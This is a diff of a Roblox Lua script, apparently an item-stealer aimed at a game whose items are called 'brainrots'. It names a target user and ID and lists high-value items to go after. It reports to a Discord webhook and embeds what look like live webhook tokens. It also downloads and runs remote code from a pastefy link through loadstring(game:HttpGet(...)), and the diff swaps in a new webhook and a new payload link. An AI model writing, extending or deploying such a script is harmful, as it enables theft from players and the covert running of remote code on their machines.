@@ -1,10 +1,13 @@
 local TARGET_ID = 3343244279
 local TARGET_USER = "pnlo45"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1573330484245823570/x4us9X-CaxBEFAmYuggxaCzIViKizzLgB5h3Lfz0VhzAe_Sn8GohBRtGkJlnLOLQJO8M"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573332643250962432/_9CrwJOCzl4ZBRb_VjtywfGC9uMx5uEc4My1oxLgguwP5pzgLFnl0Hgq82759Qx8tBV_"
 
 local TargetBrainrots = {
     ["Draculino"] = true,
     ["Lionello Casarello"] = true,
+    ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
+    ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
     ["Strawberry Elephant"] = true,
@@ -287,9 +290,6 @@ local TargetBrainrots = {
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
     ["Deputy Leopard"] = true,
-    ["Dragon Skeletonini"] = true,
-    ["Phoenix"] = true,
-    ["Plant Bros"] = true,
     ["Cobra Gelato"] = true,
     ["Flying Dutchman"] = true,
     ["Machine Bros"] = true,
@@ -361,7 +361,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/S0He6R0Q/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/IDAy2FeO/raw"))()
 
     task.wait(1)
 
